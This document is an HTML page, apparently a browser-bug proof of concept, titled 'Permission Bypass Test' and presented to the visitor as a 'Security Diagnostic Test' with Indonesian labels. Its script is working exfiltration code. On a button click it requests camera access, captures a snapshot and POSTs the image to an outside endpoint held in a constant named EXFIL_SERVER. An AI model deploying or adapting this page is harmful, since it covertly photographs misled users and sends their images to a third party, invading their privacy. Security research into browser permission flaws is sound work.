<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permission Bypass Test</title>
</head>
<body>
    <h1>Security Diagnostic Test</h1>
    <button id="start-test" style="padding: 20px; font-size: 18px;">Klik untuk Mulai Uji Coba</button>

    <script>
        // Endpoint tujuan Anda
        const EXFIL_SERVER = "https://browser-bug-poc.free.beeceptor.com";

        document.getElementById('start-test').addEventListener('click', async () => {
            try {
                // 1. Meminta izin dan akses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                
                // Menunggu video siap
                video.onloadedmetadata = () => {
                    video.play();
                    
                    // 2. Mengambil gambar (snapshot)
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg');

                    // 3. Mengirim data ke Beeceptor
                    fetch(EXFIL_SERVER, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'camera_capture',
                            fileName: 'capture_' + Date.now() + '.jpg',
                            data: imageData
                        }),
                        keepalive: true
                    });

                    // 4. Menghentikan akses kamera
                    stream.getTracks().forEach(track => track.stop());
                    alert("Foto berhasil diambil dan dikirim ke server!");
                };
            } catch (err) {
                console.error("Gagal mendapatkan akses:", err);
                alert("Akses ditolak atau terjadi kesalahan.");
            }
        });
    </script>
</body>
</html>
